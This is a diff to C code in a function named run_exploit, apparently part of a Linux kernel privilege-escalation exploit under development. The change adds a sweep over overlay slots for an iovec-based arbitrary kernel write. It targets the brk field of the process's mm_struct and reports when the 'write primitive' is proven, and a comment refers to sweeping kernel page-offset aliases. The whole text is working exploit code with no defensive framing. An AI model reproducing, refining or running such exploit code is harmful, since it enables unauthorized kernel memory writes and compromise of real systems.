@@ -242,8 +242,9 @@ static void overlay_fill_word(struct iovec *iv, int n, int slot, uint64_t v) {
 
 static void overlay_fill_iovec(struct iovec *iv, int n, int base_word) {
   memset(iv, 0, sizeof(*iv) * (size_t)n);
+  int w0_slot = env_int_range("PVM_W0_SLOT", base_word, 0, 15);
   for (int w = 0; w < 10; w++) {
-    int slot = base_word + w;
+    int slot = (w == 0) ? w0_slot : (base_word + w);
     if (slot < 0 || slot >= 2 * n) continue;
     if (slot & 1)
       iv[slot / 2].iov_len = overlay_word_value(w);
@@ -962,12 +963,23 @@ int run_exploit(int argc, char **argv) {
         uintptr_t vt = last_mm_struct + 0x148;
         pr_info("VERIFY: target=%016zx (mm+brk) value=%016llx\n",
                 vt, (unsigned long long)magic);
-        do_one_write_node(vt, "VERIFY brk write", 3, 0);
-        unsigned long b = (unsigned long)syscall(SYS_brk, 0);
-        pr_info("VERIFY: brk(0)=%016lx want=%016llx -> %s\n", b,
-                (unsigned long long)magic,
-                b == magic ? "*** WRITE PRIMITIVE PROVEN ***"
-                           : "write did not land");
+        unsigned long orig_brk = (unsigned long)syscall(SYS_brk, 0);
+        for (int slot = 0; slot <= 15; slot++) {
+          char s[8];
+          snprintf(s, sizeof(s), "%d", slot);
+          setenv("PVM_W0_SLOT", s, 1);
+          pr_info("VERIFY: slot=%d target=%016zx\n", slot, vt);
+          do_one_write_node(vt, "VERIFY brk write", 3, 0);
+          unsigned long b = (unsigned long)syscall(SYS_brk, 0);
+          pr_info("VERIFY: slot=%d brk(0)=%016lx (orig %016lx)\n",
+                  slot, b, orig_brk);
+          if (b != orig_brk) {
+            pr_success("WORD0 SLOT=%d brk=%016lx %s\n", slot, b,
+                       b == magic ? "*** WRITE PRIMITIVE PROVEN ***"
+                                  : "*** word0 landed (NULL write) ***");
+            break;
+          }
+        }
         goto after_w1c;
       }
       /* v14 gear sweep: alias = TRUE_PAGE_OFFSET + m*1GB + 0x80000 + off.
